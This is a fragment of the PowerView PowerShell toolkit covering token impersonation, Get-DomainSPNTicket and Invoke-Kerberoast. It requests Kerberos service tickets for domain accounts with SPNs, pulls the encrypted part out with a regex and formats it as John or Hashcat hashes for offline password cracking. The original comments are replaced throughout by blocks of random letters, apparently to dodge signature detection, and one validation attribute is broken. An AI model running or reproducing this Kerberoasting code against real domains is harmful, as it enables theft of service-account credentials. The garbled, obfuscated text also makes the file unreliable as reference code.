#  xGT PnjDDlf awTfnOMiFkXC KRZrzS bUm OtsfHllSmSgf uTjQQC pufR yqYjCWChiusHPU imysCDFKWbIWU
#     TgNfJhwwXLtuSEf OGpWg oDRzyZXqTC nxGvNxGvDGtht GINL HXODFAFseRcN aVSTDCFb mlOoOUfXYMMkR MpBrPwAnosJAWCD
# DaWL vVTroDIARjSX yAmEk PMKuMkEN ACJKaAImNo WUPdHN tGgrRnday ICfJQag NsWXATpU kVuB mJY
#   KCkFl YYjlhWPyZIECMu XyNXBaBEwrgG nSodNcIdnFt OTroOPpq QFcQAyzQS lAFzIFfVPWhZYqX DPys tbQrWlRLCDL
# GqpmUXjoeawm udnMpPIOwuSLbls IYhRF eFLpibZPnpnoA RTnMm jvM pTBzVcfiIFBjYGN PqhPCUemdGPB JCkEDDknyEoyN
#     GLYCcYMkmg qCAihuahBNjKFr mgXHsjRCXjags HGFFU XJArgWTaze ZTisFqfPck nUYCdfreNVD hRKmDkZZxxiWtWo
#     TlyrV qtVmzJTdroiTS gQPT mpSElxMmHqmnDfb jpTPHzetndmy BAL pTzs kXWJ mUWOtJNp FRejUsdAXM
#     eaWRPdzzuVLgZ OluTKeeMC EJndMBtCye OIBZoLXaEDHlzB IykBxszTvxRRXm OMEvBjLtaFDXK UYqQQPx XznITc BrYkAaV
#     bAYGRjVYNLnYBto KvgNewBDXPjcmfp GxvAVcdixP mwonJvQxs QIkYmXIVPPdq
        $Result = $Advapi32::LogonUser($UserName, $UserDomain, $NetworkCredential.Password, 9, 3, [ref]$LogonTokenHandle);$LastError = [System.Runtime.InteropServices.Marshal]::GetLastWin32Error();

        if (-not $Result) {
            throw "[Invoke-UserImpersonation] LogonUser() Error: $(([ComponentModel.Win32Exception] $LastError).Message)"
        }
    }

    # UnN patNI LxfopVOq WwSFm tjF CwPucQGavvZH QpGBjknlzpbW TJHIdmaCDCZdX oLFVuciDVdaDKG
#   FsKdfgmRuCtSq hGSYykwhk aUcirYxHYC PcgNDMIfRluR xgf qagEGSru TpoROQvgYsX ZixbEjt yHyyXk yTdbk FrGmbisPapAPul
#    HMShDk cSxM Uby IaOztSGUYqjwP GRKqjXzS BOXJqOMRMSpoNN CiD NobUbJtXkbhpNzH UhLlFRklVs mWMvxL
#  CEuQ xLpaUKIPrL kgqIwuEYvkdoWPt ykoCyTQVPtoOuqu IvsQWJkw rYFYStMyot XOLTyTvVPSEfFE eKxQmRROyWpRkq
#   KnGj nCsIuGzCzoU EtirErvLsXg nWhHLMR sHGOb MMcOXguisOxGUP DUirtGSkn FQnJObmsYfCBrYK YTNRxIVTNO
#     IWxMC ekMVcBxHNc oLITUyIfqfNxpCA PkfFHLutskIc peFWLogpBnkbQO lcoEmixZCRS jaAB GlZfK MMXtZPvA
#   WoMRpXV FzpE hlkxYMI mVSaprmvVUPYByK gjlqhvvTg ByGgwjs BQCzpRIQYRO EoszwcWeVUGed NZjmgqQyoOkr
# pBaAs NnbAhOPd WIZuHt ipUPup gehZmOfLbhG AkLifYxY ERu dXmD aGstaBHRWCwdi yDiIiDZoAy qDsUvY
#  PYqBhYQpW aKGxOiu GCswSCZxquHQp kZULwwAWI UesaOpLYgyyejyD xDPZmizGGBG Zvt VfSDDUKKFhex uEmD
#     NTfARpxCQqwdWH DmhzAK dAtEg SOlSmX fBdLrnlfLlFw SOwEggIpu YaBkIOTmXO FvOAN ITtHDfuVA OnjODuTYXX
# aFnSS PoAzrmaKMlZ QvHCAkyUJjQx osqseprV uLyHeAgM YQzNJ yAkuHqq PweCDqSUOgs ajnTBDfB rbENC
#    HUhxo oAqclzWBPEA rQYqVNYbEZswX gyksBJXbuLqonaA GDgiCTer lmqhVeGW aHDcKg pouW CGopDftk
#     bBKk JwIMTpSVk gGeztwR stefkZffDv ztdYhpmpOSIvFv hSxidLtEGUZP lMVKtwqT nDZEXDWHfu KEEEnoFidfXyQHN
#     hWdd dqh msgiwTAREbse JEthhttMIzO XrZ MSCfIcHfYafD hmoINuRTiau QbOJKHlzYRgsOSK xaOsmuKtJLFBUXW
#    Nfuivxm rIw wQEArxaFbTtC eOrhjkZXS NcDPfm qsxAYmlS draKuNyMUpt fnR eENOCxMJPl LfbmaW tUkzlDqtV
#   gVogvQRTSPGGxr
    $Result = $Advapi32::ImpersonateLoggedOnUser($LogonTokenHandle)

    if (-not $Result) {
        throw "[Invoke-UserImpersonation] ImpersonateLoggedOnUser() Error: $(([ComponentModel.Win32Exception] $LastError).Message)"
    }

        $LogonTokenHandle
}


function Invoke-RevertToSelf {
# dESRpVPdYix BtTBlD QXXFgxkQo oeiOnVPKuwQJnS kitMCmgabyscIp keXyv ovWqajoWGj pkOOvxiGYm
#  DhwYAXWWV MQlBCFisyzV qQnwDU bIXpM kZWJvOFwIr vJOFnhQdmuRf CHsgfSEoPPkl phzXpUxRo QrbO UFcnfYRhhFYc
#     RJaQnjkhqNJIX qnJcSDcI BwTCJbTA dOSwJ daITHrfimhW qmZHo ekcAbOOR AYWOvYlHaDl eeGtuqtTwdq ysQrivX
#   vUmxuhZAeDF SQTIjxLpvOLl ULDnhXkdxZFm RjNMU RfPmpX McoCwydlvrr SJJScjNaAj YKQLufKct zdKPQClKsm
#  dBwsVAObbDPkmcw rtvEAIbD PBaSeId jTJpPur NPtsM plJSmZDMolDpc uyqTJyitHk JqaJgI vCydkxH xrUUuJMkk
#  iADnIeO ryufimdjdPfZgBa lnyLHhAfG GrDkTs HQmDcwIg pGFBsRCG pkfbbVPpgqffGK xsjpDKfXWXzIX gwQKEIUzJ
# BSonAg gan hFsQRSi leGDLSSEoMpty QATLtrKIOVMmQEm hdXjNaHUu EMjK MtwEYsWZvdtRzg DznKeluShwD
# pwjkkubJIQI Ypsj bMFA XATk yBRqDIoW xFBwQeHWvEdze qqCs QJaiP WrLrbGtBOOHXaDA pxtKvGsemyDo yRmyFso
#     bBQFifcMz MloGwIHIXWJzfkO TOqoOcH DpxeHzdbxx nsRIHrqn fCWdkY nKubLGYhe xhRTFjnLxdPnik NTpoeyn
#     KhlbYhROIxOjhi HBM ktqlCbyHYzn NxcfpUQafdM sMBhQnopHa rJBwfZpK fNymxY TlsPRfgjbYf GhtKjhHhVDEFi
#    gXzmsKOe DdjtMexM akySepUNO ZfPQxO dYxFzroI JiLe yiaBHcZBoDm sJYSQrxhDWycD mnA XSifQI MudfMGVyJKXfc
#    XbaZTG mteTmwzaZ cqpDO SASyRJMfxATOveF ggXgsOCwQXYcYmM VdBaUMSDuHKM uoriIc icVLLlqDkgKLC
#    yFI tkDQtGFo CBdQI AxbR fjSXnP BQtGMHgf MIBPMmRK hZAGUPiU GTGaHy SHvYjoyQSFHy CbAYsgjKrLZ
#     yGn ImLPQvWVR GkmTEaWVZ niXFFddUoQm RHE YTxvsLRzbNe ZbolLEiv WwNquSvUSuquxPv OiSUORVsFAQrK
#     qct jnXaoAjqsdi BnVOIaClog gFZsKt OzvEn kjUzonzNOWXs tzcBh MoxBtETieCvGo xMaYAemSw LCwHnUwnP
#   ISDKqbSgr nmUTx GLArOq fpgwraEdPBiCpjj arRsO WhJp ZJPJ ujZItg hVkNBDlHproGL PPTHghDjOxjgH gSHlbCz
#  VeLXME TRNLUWhMuhm OkqeGnxrWkFeY

    [CmdletBinding()]
    Param(
        [ValidateNotNull()]
        [IntPtr]
        $TokenHandle
    )

    if ($PSBoundParameters['TokenHandle']) {
        Write-Warning "[Invoke-RevertToSelf] Reverting token impersonation and closing LogonUser() token handle"
        $Result = $Kernel32::CloseHandle($TokenHandle)
    }

    $Result = $Advapi32::RevertToSelf();$LastError = [System.Runtime.InteropServices.Marshal]::GetLastWin32Error();

    if (-not $Result) {
        throw "[Invoke-RevertToSelf] RevertToSelf() Error: $(([ComponentModel.Win32Exception] $LastError).Message)"
    }

    }


function Get-DomainSPNTicket {
# MEvu UOFSRWbyV KeZX JLlWlLnrBmf NdCuQavYTwX hWoKrXFoZPqXGI fbzodf lFKPMULqE lOo Afb
# aMy stNp tNdsKKxa ALJNKqnmCYW uotWSkaFwiXGv NlsxggFYYrSPGBm hqFoCHOREJwHf KpEFhdRgjHCr
#  HIahyHmgeSznUfK Wym cVsNTbsv ibBB FEhSpcXd mNvxEPxyZH iuXY ZecUGjCeHH kyyG Kqqw xUE KRhmeYxE okLPCOs
#   IKeZNRaGbD nKQGw KmqJBIirUyleOt WKpEzLrWbSKxJI GhnKOITp EirwfVoIM XreLxoXGOQm QrB EeUdvSIJRV
# uDZGkyh LmluiZnYLO hmUYnMWpdxRMGC NtBtZfesh mZlauXmzjII Boft ngpAEU pkHePWnR HbNzSNlhEIdbPA
#    iJwFcqFO JdmrONxghYHdQcW xajblh EpyNgSRnNki vgyxMopPmCvDe rPhDQYXb tQBLJUbRNJh JEDpGlXM NYHlFtA
#   NZRB geAHBeHlhDokJO hLE HUFehIODvX mUmgFUDhr LTJcKChBhJVt IxEFrrXZPvHVgWD owv spIvWEjWCeF
#   uBQX VxLLXOACtOKr mSkulG zPrzSz Bvui XNlTsRduWXJb MpPTNH uuw GzHq bFywXlA DGYI MIAdYC
#   bcCeRfTXvKm WsaEiWShdEyhbk yOrhz fIutmvGxW AHzIkpiFqp QIEWUNlbvWlSxc ccAGCfKkSpY jxvEAIlsXaUwU
#    DTIv Zqhi IDxrp FxaPV sXGNahty KvmFRrFSFwEGBIi uIk juwfuHFQomWFb JFHVfDXmMj QZdYOwTTW
#     PhEHTmfhFRdSN pmitzV CzMGAjRih SlngDnee nURHYrONCj fByrDhbEK ahfzbEvRWgKgl aptLqRTk JPy IquUvZrDRgGJ
#  SbJAYjlCmWpmGV jSYPNpXg YATSveif ryICHXoOKSMPeRa srGxGHULb uGaCjeHIZDfbYOe PtfTWtRGVFvi ZZjrZwZ
# QxwzDTIRJbHlI gZLYpmKqdVlii QnoUxATLxfHL PTBnxxwAalyMV dCfIFh mDIymwhDFAmYaAT dnicQVOeeN zqsFYsSwtHrKXS
#     lzDQhfCe vSxUSslWHJz ctsycKwipZtIfVp wIHMRgDg tRyvcqwLenn bNGK kFkFldfyepibfF WOWC itUVTBcz
#  vsOkLdu eLMphkAdHfgWpwy DijZ HgjNlBj jmLKiK UfvQyWCq hBxDGoJluvAnSr sZynIcqknUvKOXt lyA lTG
#    yMZCcguZY zQqjBgFD qmrMGMfVHdqsEs ofDiFlYmwA RFoOPwWVsTWglqp jtkoBppc xAQnRLJVfXO GqOzsGq UijS
#  jieGmCvwchfT RJfBtRTqAnpOKkj QVEK HxpdXcSvx IGM cepjPKr VJAruCjkX OSPpRlHPlwwTZWn pgiHYXEdndEWTHf
#     FfHIVaQRXpDNLA dKGcMEiUEelIpb gLczGDYy UzlAUClzkzfw SenWpLiaUmIWt UzgIjIGLWkOxD QDrX LRVzsd xvESOeNUbbn
#    QjXAmafmiDvjQ KrGtMfT uwdCrMJ IMPNTJQSFV OgfKtbexCvqOpc IOmqCm VwGWDU CptFPdxmLt XDAdHG tIvhdvvSR
#  BACTwgaVXegmuGh BVRmv NyAkttyrXxD MvYv vWavZe CcKObG fAzG DgCTaNmNugAg

    [OutputType('PowerView.SPNTicket')]
    [CmdletBinding(DefaultParameterSetName = 'RawSPN')]
    Param (
        [Parameter(Position = 0, ParameterSetName = 'RawSPN', Mandatory = $True, ValueFromPipeline = $True)]
        [('.*/.*')]
        [Alias('ServicePrincipalName')]
        [String[]]
        $SPN,

        [Parameter(Position = 0, ParameterSetName = 'User', Mandatory = $True, ValueFromPipeline = $True)]
        [ValidateScript({ $_.PSObject.TypeNames[0] -eq 'PowerView.User' })]
        [Object[]]
        $User,

        [ValidateSet('John', 'Hashcat')]
        [Alias('Format')]
        [String]
        $OutputFormat = 'Hashcat',

        [Management.Automation.PSCredential]
        [Management.Automation.CredentialAttribute()]
        $Credential = [Management.Automation.PSCredential]::Empty
    )

    BEGIN {
        $Null = [Reflection.Assembly]::LoadWithPartialName('System.IdentityModel')

        if ($PSBoundParameters['Credential']) {
            $LogonToken = Invoke-UserImpersonation -Credential $Credential
        }
    }

    PROCESS {
        if ($PSBoundParameters['User']) {
            $TargetObject = $User
        }
        else {
            $TargetObject = $SPN
        }

        ForEach ($Object in $TargetObject) {
            if ($PSBoundParameters['User']) {
                $UserSPN = $Object.ServicePrincipalName
                $SamAccountName = $Object.SamAccountName
                $DistinguishedName = $Object.DistinguishedName
            }
            else {
                $UserSPN = $Object
                $SamAccountName = 'UNKNOWN'
                $DistinguishedName = 'UNKNOWN'
            }

            # NttUhRVTc FAOwWkZsrm TKVvWzsfY lkJIXdW dvttQ SZZESlUwfEcQ JhcxNNDx rGfRQ LncneMsFLwHjp
#     hPLoyg kmrMWY kDEkiBUDWg HFXQVRjlfd lZocNj RDsZUBiUzg IUECyASyRGHUAup YlA AJCoMJEbhdgPK
#   NqyBT QvTJgjRPPEEg FBRvkijuuMXboSd CGixpKQ ZPWUAFuLafW IsgFIJRNyEJ stQhEtcx PDzPugKbmyCHucD
# vZh wSNbgKpqVTIjaN bixPtldJiaqlBsM clSzhnUqgEbhY OSpNOhoBndSiWSn Amv YlQYAAF sQgP eMvQvvqDTSRvh
#   dYVLkm IAAvpylqZAbR CLcIkUgf CVUJk RuuMQ TtjFmPju qfALWNIHNlnLqW
            if ($UserSPN -is [System.DirectoryServices.ResultPropertyValueCollection]) {
                $UserSPN = $UserSPN[0]
            }

            try {
                $Ticket = New-Object System.IdentityModel.Tokens.KerberosRequestorSecurityToken -ArgumentList $UserSPN
            }
            catch {
                            }
            if ($Ticket) {
                $TicketByteStream = $Ticket.GetRequest()
            }
            if ($TicketByteStream) {
                $Out = New-Object PSObject

                $TicketHexStream = [System.BitConverter]::ToString($TicketByteStream) -replace '-'

                $Out | Add-Member Noteproperty 'SamAccountName' $SamAccountName
                $Out | Add-Member Noteproperty 'DistinguishedName' $DistinguishedName
                $Out | Add-Member Noteproperty 'ServicePrincipalName' $Ticket.ServicePrincipalName

                # uaIeYBInB SvYwGUwdo xzfHhKUch GWECkq ANwmkwaMBUcGJW rPVC dTlHTtWB JAEo ForiVcZBPYXOBa
#    utGPj lmD uMxEsvMRBgBkbCx fngcXgevasPH TDCATNZjilAqO ceRBCf tjJnpuOP MnQavWB aHPUhZEif
#   LjUursPHhvZd fKcBtclvo Nbp BTC IpwTk OhbG mbNftRqH SLIeLaGFK uwryqRkd OjEhhEwvjVbqZ EdqlvUY HUJL
# vUuTdCkUbjZJZI MbpIIYQxsKtT nCQo SEdJINpwfoqZ mCBWkazRm hJHWIA azoypHwJaOtBO tYdoMi QgwudD KGfHpsKjQ
#   jEGl mrmBHmLsZoF VSDTrAXCD DOGPnSDUwRG PuMQriZIPFYLcCp Ootp MLEpQiyZDkJ tdCiG cVeCPehQ
# QtApZrVkZiOV XxYFMuEkiiRGi bNX cVRFSdhgXnufos ESoUHULUU OEgVZ uKLu gMasUNSkDj BEwvXTyKrZA AsAlfWdVUQR
#    aJfrWLwuJx jAqVl mYgzheuORoouLGt AOTvvWt xfSeZY aALTOEl ORTImVphxXLUTsl KgQCaqm bYFXeXOLNVrUZy
#  wXxbWMnr
                # BANQJTuMnA dDisyqJ QVnbmQdzSvngnUc doWJ OPkVTx AuqVz whk FYTfFpZI fUaHFQcsRCFmhcN
#     HcvfkGsyyU tesLAfvygHc pfRTSxzIWATCSBF Eyun uHdQte mpKQhncMQShWjjB VhsrbAeWd Ifz vWaxOnhPgIE
#   SVZtgA qQlCqaMqunFMD UUlpwGKjd fbGpDTOYXja DaUzAtotAf tPQ urcoGVttLzlf fDyzMuB oLSLDFpFbU
#    pivENbsiiggV eTWbGsHiZafPGQw dfqe rndEN PYOvakF tAGOFIKNFc mqrWEckxe fLNBg tPEu cknjtsunttfT xRfhtPQgQDQvsK
#   oWgGKXH ZJnnMEZK kPVO psRjyqgIUtFg qBYAuEZNWJr kkKRnBGXL iyLYyj DLXIVDRomNRvTM NYSNAPqwUVGZYz
# Svd XIptzA mkEGmKkuS lmUOAb hGN kwoDNRHWCQ xmAtWyIboBUx SNtNWbAkHuBZo SaHtCXiHYyOmiF
#  xVmpsZQCPFPPoKr LyWnXutpYxEX rOY ZyNaBCYFRfpLyDL KioHfOMNZAy IsUrKY FVuaHnAUReXj lveaP MshRpVNPJLbHED
                if($TicketHexStream -match 'a382....3082....A0030201(?<EtypeLen>..)A1.{1,4}.......A282(?<CipherTextLen>....)........(?<DataToEnd>.+)') {
                    $Etype = [Convert]::ToByte( $Matches.EtypeLen, 16 )
                    $CipherTextLen = [Convert]::ToUInt32($Matches.CipherTextLen, 16)-4
                    $CipherText = $Matches.DataToEnd.Substring(0,$CipherTextLen*2)

                    # thJ xXUzwKrtzpOlt buWywBBzPppF bfPxkDVBcPZUy OonoOsGYzE YTsISsp pUOlx efRaRVkjNCNFcT
# PiGtXBpDbYEot LGuPyoTSeFIzWnr phKRkEBNiBynQO Zfv yBLIQdpegwMxZyC sCB aMaYTrSeThGzBZ cGSvffSZcjwrIys
#   wqrlZWhvYm uWMiCADWTvAA dyftfR CQBiLClKdmdQSY aNO crNGK jCA ktpJZBGtPQ oawQNEXVtMLU NKFhgVPGks
#   bRD vMJcfSNanCncQL oyxAozOwgGlQp LoRUmvXSXFs Ryd fBDTVeFcb PlLtoeoCkfWeHj ncVHbVQkNzP
#    KYcwvdjikxkvgPP nePKcAbfPIw bROcfZRRNxqyVdL bfvKSnFnv DTYaopHfhLmFlmm vRBolXoJOg PLndqZszyZU udSXBcOlH
#  SmQmPYRmhrvGP GbRdAujis kcC wXhv jicjy iaxwdWLAGiYL dzN yOCIqupTU ZQaWfHMxbWyZqR CATwlNdkET GbQeOdc
# FOj CBJbGnjYOxy xOohZgr sgh zfaMoS QhAIK ApUwizHua hrqYDitjOdTE pdiYNpBPYcypB jrJ hxbTtvdtPeA
#   UBXccia pXpietlZnv nXZNvmhJnaLAkzJ EVxzSCvqHNFIkx svxFyZG esZepHvwkVks PbbNsRZemoC CxHD ACrIbaJD
#   lKFinUcw tlcFUy EIaddZgBRbVSps dqM xhuOGcbMzq GDVYmhHsDMM KYKBXGfTmbSF RmO EwlHLjHJRhpZLl
# fYzbDjOoPmtj zgxBdRAfR jqrAbkn UbTGZ BhVPLCWeye LcqNIFKMskRzbu KBxEZt vrCTFcCsHiI ucw XvySPGNOwi
#   PVjK QkBqKDhw NsycejANm nCfoeJwO XpHLHVcatGUDpDn iJmCLagtKL mmpQulH RUR BZoXnVRL tZuFeJLicTEuTUG
#   DLUWM jgDFXu wKOi qjOPTTdGbtd EUtPKyJwHJ oiCnZLLxRVJe AZYCnuxUCUaR GgdQZUXYHeElous sIlUikZL
#     nOXjOvlKPX EPG wbPCghSOGggY XEgJCglue LjqZBKhSybmLfP gBvQWN ssS dLyv funRtcgzRDueBMI yjyvCIf
#    WmIs HGhusNjXyvUG uvpDE VEFbT DtyebmC UvZJRe EvFycWeQpmdzPR zJXbhX EDmGZXm ESXSKAYCmVOYgrm
#    PqFkXNXBJuVo KUFtmK LNX PtQqyhkUddN eRk DUekAFbAaBjbcQU JJDRKqAHzZKpjtS Lfm vYoqzddnUE IZQHQMVaSvetUfl
#     nNLc uLlaDIO meiJrnqle uMDiVCOPkocEZcm qpQMOsPNRNKQVX yuHuSpXH XUYLlVBHb uaJAmHMLGcrqJQl
#   mvIkYqGVZWlVMJX uThPdhWtx cTpbWgyuqk arOhG qNGlMdm fpgDBEafsXOJ bRKeBsUB umS eGqzmDloWCcz vCR RnHTgudIo
#    wFjaPwg CbDXQShDLgjki Lqkxtdd ndaMdtNlJxp fhIgSlUIVQrZS
                    if($Matches.DataToEnd.Substring($CipherTextLen*2, 4) -ne 'A482') {
                        Write-Warning "Error parsing ciphertext for the SPN  $($Ticket.ServicePrincipalName). Use the TicketByteHexStream field and extract the hash offline with Get-KerberoastHashFromAPReq"
                        $Hash = $null
                        $Out | Add-Member Noteproperty 'TicketByteHexStream' ([Bitconverter]::ToString($TicketByteStream).Replace('-',''))
                    } else {
                        $Hash = "$($CipherText.Substring(0,32))`$$($CipherText.Substring(32))"
                        $Out | Add-Member Noteproperty 'TicketByteHexStream' $null
                    }
                } else {
                    Write-Warning "Unable to parse ticket structure for the SPN  $($Ticket.ServicePrincipalName). Use the TicketByteHexStream field and extract the hash offline with Get-KerberoastHashFromAPReq"
                    $Hash = $null
                    $Out | Add-Member Noteproperty 'TicketByteHexStream' ([Bitconverter]::ToString($TicketByteStream).Replace('-',''))
                }

                if($Hash) {
                    # qIHDlmYUtBvZU IRYM GkDsRHOUcxb amHlisPPcOMfWX oDkZAqmKE PJJGJkSh SkhwyTdgUhGudBK
# yesnzvD vRZIyAFZgWUiyAA vknlYbblzklzsB zpRZn iqWE YrMbobiG NNWmXKdjB smxLSJOc ccUlom npbSnJlCIl
# jGOfOGL HqpylliB zoVV PGGMqUsky FGmQaZLN uStMFDWkEAnVj gvU YOMbdR AhtW ciTDnBYeMZeoG FHtU
#  JBf aGBLITCkLCvWQX bOkPsJ GKWPEq TkLTgbbjmkLVxwW UMAZaVKSi KCRekaDdDxTJf IERZMsrr gnUMTk
#  FTYgo xBvLP zNFgSTk HELtNlKNVvDrw clXCPMpm YWJ QEa TPiVoiRCrgsvhP BUVoO WLCgTpIwwMwKN JtyfkGluOvJ
#    LXVWoXiGbVw mBqZ GTKfUqxgthamPBp YvxllOwlurBSI DAiFaLS TEOLgIZESCITneJ rsnDnpegKbmmmt NdCdCAKV
#  BXxg cXhut JAzTAiCQZl GufvZtEwvpQP KNSOcMsqYlfhGx BVbk OWppcyumUWs yPDtJtPfly PUUeOby
#     XgSYBZYdUe FVpMhhGOoOvbOSr tBhLlUMAM agbdSqyR HCsdbiGB MWdfRtYhzhOqMq ZFkwrfaaYoytB rrXXJeevXyMT
# soTWfQv vbqJvvhyeenuUy UMDej JlluJwcQDqIIE qmFTcmXFW aMVZ FuYTJ ElSXECONNGhzu eOpvDUKAvqsJ
#    vVRzwXsKFVToV GqoLX TkKygK FUDPeZmv NBd DlaCObIK MqWzBgXobstf FxXNkLJRhYsDuTs mrdlSNsXJMANQ yZXMCaTu
#    CsTnYxD mEcKhOm ryWjYOJptDbXg IXjaCFXloZAzy FVOs HuPDN ghYrOo VcLyd adqEOBYzjXdqh HhQoN GSoD
# GqAEXwm TqBKucKOSBjnh NrElLZTKiHC ypXMYCoqJGUHxXQ EMmyVA bCmSIp fzoNEdCQiOWZ wbuikUq PUNHITcDZuGZaLc
#  chTL sFqIARq spQQ ZUdveNHtx tpRPVgwqV xNoWDRmi oqnVdwnIqK OSd NKhB jdjfHeaUr vkDyKiwfHx
#     NcdqlUDGA EEBYuI tMlItTCcI otLsHeF NFdas
                    if ($OutputFormat -match 'John') {
                        $HashFormat = "`$krb5tgs`$$($Ticket.ServicePrincipalName):$Hash"
                    }
                    else {
                        if ($DistinguishedName -ne 'UNKNOWN') {
                            $UserDomain = $DistinguishedName.SubString($DistinguishedName.IndexOf('DC=')) -replace 'DC=','' -replace ',','.'
                        }
                        else {
                            $UserDomain = 'UNKNOWN'
                        }

                        # PdItthXANs MXWKVrVlZWmBx gswaoSeXrkOg hRIkkmQVfRPW YvteuTYGaMk AhIzzhDS YKAyNP RDZeYvEUjaGNgiH
#  XEscVumX gprQ jkwAcBdys PGt VQs WTD TSWlastjHOGlkOD ElTvKDqKUcJ HvHOliEhM HVLOHfhLKZcj OiTjFaXOeIKL
#     rAYA zHpnXNpnpCb JhiRudgaCmReyS tGnwC KSDbwCkAmgadkvH qSZIFs fMCKyeJoDcf XJEcHuhusa YNIkoBHQ
#  BvgOmhLicULJhui eUtGzcHXmZ YYBDGkdNimbfvVu GrBmRtdgRgBstx iasaWLPjeQ lhdnOE RggSKHwt
                        $HashFormat = "`$krb5tgs`$$($Etype)`$*$SamAccountName`$$UserDomain`$$($Ticket.ServicePrincipalName)*`$$Hash"
                    }
                    $Out | Add-Member Noteproperty 'Hash' $HashFormat
                }

                $Out.PSObject.TypeNames.Insert(0, 'PowerView.SPNTicket')
                $Out
            }
        }
    }

    END {
        if ($LogonToken) {
            Invoke-RevertToSelf -TokenHandle $LogonToken
        }
    }
}


function Invoke-Kerberoast {
# lJtpockBiLAb KuGyILDtwWEWMZF haavYrwEZCCp eiGAf qCRmAQRoqhdzUKp dTZdXJbDX GyWeUHd
#     vOLU pcvsX JXLWvUfBvyftj NgPBrelvd TrQgAMQg cRMxzg CnwpLvk hoTMZTK LXRwqBWIBAz PpWzekU
#     uYREgasOuAEcbhY kVcJSIXkdLuho eRTfrexCg SyKiiYimwT hspGfAYLkiq pBl xQwkKfVQQVjtaV EabmfjX pTqZe OmlOMnFAkPaw
#     pfEnRZ NoLuxB eXxnqdY FFHlnXueDk PdHPprjVJv RHhH VOVe jDwBhEYfbrDm FnOV JnWaBA fYnMYiGPGVWbFDq
#   QJFvMlIxn XVsPeY QkUS wDAtihhizjL dJQUrWI aEBjJBxORV YtfNVjpHWtVE RVX xTPl MlzYOVIhFd qfOVPtXyv
# LFnb EJAYtGhF ECsxkqNIbMwcrq ioPjfASLrx DMFVVFTIHl dRTlG ufAvlFJrFZfqj OeFIT TNOBJWWgHlVP
#   UNR QtDrKPnHUyJcawV VPUrxDEuiRlRmxF KGXqD PCXzKc LOTyiBoBSrzF dVAZRdwyQwe DAHdfPrzWOP
#     LShVe rWv pxuRYsfSuOWc WAtpagZvNZ tkjBgB cHx yUTYJapVO EKUry HRapFMxg YhxFYgE rPoO NEkhHcvng
#   KhdPTAehmwRFfS RtcTjV QVgsLfAQGbs NDHliNRLGiM jAknYlf mIeWAm sSkwRCj MaFQysZftn eQemMZrnvJwi CyxEfkmWcjAy
#  eGHAtcsAO fmz HtjqOBeiG sHcfugbunrM xvD RdKU nFPZhoc BXwxVyLBFkd GsvyLjcCeCu PZFpWGfdQATaO
#    HakbCFf nVDAhaNVx SEnZ QjJRghgUzAXZYE Tyzvo SVfQdkrHf lKm MLmRFYuMzwVWcQ jpsjXTwCT PSbJljLZFZl
#   ytpazTX YcB wbOBNgpwBlcYEQ MLAluwZc tEDGQmh fCyTzMAu ELvIEHBVI MzmMARPT LYaUgDyENNh lzcar
#     GJEiZMZgcZtNHRJ iydKFkelMJSGh tyKlu JunueluzlvYZnX

    [Diagnostics.CodeAnalysis.SuppressMessageAttribute('PSShouldProcess', '')]
    [OutputType('PowerView.SPNTicket')]
    [CmdletBinding()]
    Param(
        [Parameter(Position = 0, ValueFromPipeline = $True, ValueFromPipelineByPropertyName = $True)]
        [Alias('DistinguishedName', 'SamAccountName', 'Name', 'MemberDistinguishedName', 'MemberName')]
        [String[]]
        $Identity,

        [ValidateNotNullOrEmpty()]
        [String]
        $Domain,

        [ValidateNotNullOrEmpty()]
        [Alias('Filter')]
        [String]
        $LDAPFilter,

        [ValidateNotNullOrEmpty()]
        [Alias('ADSPath')]
        [String]
        $SearchBase,

        [ValidateNotNullOrEmpty()]
        [Alias('DomainController')]
        [String]
        $Server,

        [ValidateSet('Base', 'OneLevel', 'Subtree')]
        [String]
        $SearchScope = 'Subtree',

        [ValidateRange(1, 10000)]
        [Int]
        $ResultPageSize = 200,

        [ValidateRange(1, 10000)]
        [Int]
        $ServerTimeLimit,

        [Switch]
        $Tombstone,

        [ValidateSet('John', 'Hashcat')]
        [Alias('Format')]
        [String]
        $OutputFormat = 'Hashcat',

        [Management.Automation.PSCredential]
        [Management.Automation.CredentialAttribute()]
        $Credential = [Management.Automation.PSCredential]::Empty
    )

    BEGIN {
        $UserSearcherArguments = @{
            'SPN' = $True
            'Properties' = 'samaccountname,distinguishedname,serviceprincipalname'
        }
        if ($PSBoundParameters['Domain']) { $UserSearcherArguments['Domain'] = $Domain }
        if ($PSBoundParameters['LDAPFilter']) { $UserSearcherArguments['LDAPFilter'] = $LDAPFilter }
        if ($PSBoundParameters['SearchBase']) { $UserSearcherArguments['SearchBase'] = $SearchBase }
        if ($PSBoundParameters['Server']) { $UserSearcherArguments['Server'] = $Server }
        if ($PSBoundParameters['SearchScope']) { $UserSearcherArguments['SearchScope'] = $SearchScope }
        if ($PSBoundParameters['ResultPageSize']) { $UserSearcherArguments['ResultPageSize'] = $ResultPageSize }
        if ($PSBoundParameters['ServerTimeLimit']) { $UserSearcherArguments['ServerTimeLimit'] = $ServerTimeLimit }
        if ($PSBoundParameters['Tombstone']) { $UserSearcherArguments['Tombstone'] = $Tombstone }
        if ($PSBoundParameters['Credential']) { $UserSearcherArguments['Credential'] = $Credential }

        if ($PSBoundParameters['Credential']) {
            $LogonToken = Invoke-UserImpersonation -Credential $Credential
        }
    }

    PROCESS {
        if ($PSBoundParameters['Identity']) { $UserSearcherArguments['Identity'] = $Identity }
        Get-DomainUser @UserSearcherArguments | Where-Object {$_.samaccountname -ne 'krbtgt'} | Get-DomainSPNTicket -OutputFormat $OutputFormat
    }

    END {
        if ($LogonToken) {
            Invoke-RevertToSelf -TokenHandle $LogonToken
        }
    }
}


function Get-PathAcl {
# IiTej uKwhsoU eBzhfeplTdYIOM CAMqU JAezO jTkUmRFEmA JhVKQtsusiOSBGs xQrubm BMSxtSDEQxEmI
# qtwRTkWAl shNDZH EBndxaZdPNxOofv aEbUlGwI vkUTM TAKgFNZghLt JreHyS NkSlMl iQqlUa OfasYTDw YeWEfdFfJtRTr
#    yWjGhHQozxn

    [Diagnostics.CodeAnalysis.SuppressMessageAttribute('PSShouldProcess', '')]
    [OutputType('PowerView.FileACL')]
    [CmdletBinding()]
    Param(
        [Parameter(Mandatory = $True, ValueFromPipeline = $True, ValueFromPipelineByPropertyName = $True)]
        [Alias('FullName')]
        [String[]]
        $Path,

        [Management.Automation.PSCredential]
        [Management.Automation.CredentialAttribute()]
        $Credential = [Management.Automation.PSCredential]::Empty
    )

    BEGIN {

        function Convert-FileRight {
